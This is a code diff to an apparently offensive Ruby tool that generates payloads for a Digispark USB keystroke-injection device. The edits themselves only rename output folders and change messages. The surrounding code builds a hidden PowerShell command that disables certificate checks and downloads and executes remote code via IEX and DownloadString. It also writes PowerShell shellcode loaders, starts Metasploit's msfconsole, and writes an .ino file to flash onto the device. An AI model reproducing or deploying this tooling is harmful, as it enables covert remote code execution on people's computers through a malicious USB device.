@@ -1,9 +1,10 @@
 #!/usr/bin/env ruby
 # Thanks to:
-# @mattifestation, @obscuresec, and @HackingDave
+# @mattifestation, @obscuresec, @NBN, and @HackingDave
 require 'socket'
 require 'openssl'
 require 'readline'
+require 'fileutils'
 module MainCommands
   def print_error(text)
     print "\e[31;1m[-]\e[0m #{text}"
@@ -49,14 +50,14 @@ module MainCommands
     cmd = 'powershell -windowstyle hidden "[System.Net.ServicePointManager]::'
     cmd << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
     cmd << "Net.WebClient).DownloadString('#{url}')\""
-    print_info("Run this from CMD\n\n")
+    print_info("The Digispark would run this command from CMD as administrator (if you are a test guy!):\n\n")
     puts cmd
 	puts "" #Some space
 	sleep(1)
 	digisparkrun = get_input('Generate the Digispark .ino script? [YES/no]: ', 'yes')
 	if digisparkrun.downcase[0] == 'y'
 		digispark(url, template_dir)
-		print_success("The rapid_shell.ino script has been generated successfully, check the ~/templates folder and upload it to your Digispark.\n")
+		print_success("The rapid_shell.ino script has been generated successfully, check the ~/digispark_arduino_code folder and flash it onto your Digispark.\n")
 	end
 	#ino_file = "#{template_dir}rapid_shell.ino"
 	#inocmd = `ruby -pi.template -e " gsub(/AUTOVALUE/, '#{cmd}') " ino_file`
@@ -125,7 +126,7 @@ module MsfCommands
 		system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
 	else
 		print_info("-->Checkout this folder for the .ps1 and .rc files: ~/metaspoit_ps_files\n")
-		print_info("-->Do not forget to upload the generated .ino script to your Digispark: ~/templates\n")
+		print_info("-->Do not forget to upload the generated .ino script to your Digispark: ~/digispark_arduino_code\n")
 	end
   end
   
@@ -162,6 +163,7 @@ module MsfCommands
     file.close
   end
   def write_ps(file_path, ps_file, shellcode)
+	print_info("Generating the powershell script (used on the windows machine to invoke the shellcode)..\n")
 	ps = ps1_cmd(shellcode)
 	file = File.open("#{file_path}#{ps_file}", 'w')
 	file.write(ps)
@@ -181,7 +183,9 @@ module MsfCommands
 		digispark(url, template_dir)
 	end
 	#File.open("#{template_dir}rapid_shell.ino", "w").write(inocmd)
-	path = "#{template_dir}rapid_shell.ino"
+	digispark_dir = file_root + '/digispark_arduino_code/'
+	FileUtils::mkdir "#{digispark_dir}" unless File.exists?(digispark_dir)
+	path = "#{digispark_dir}rapid_shell_READY.ino"
 	File.delete(path) if File.exist?(path)
 	File.open(path, "w") do |f|
 		f.write(inocmd)
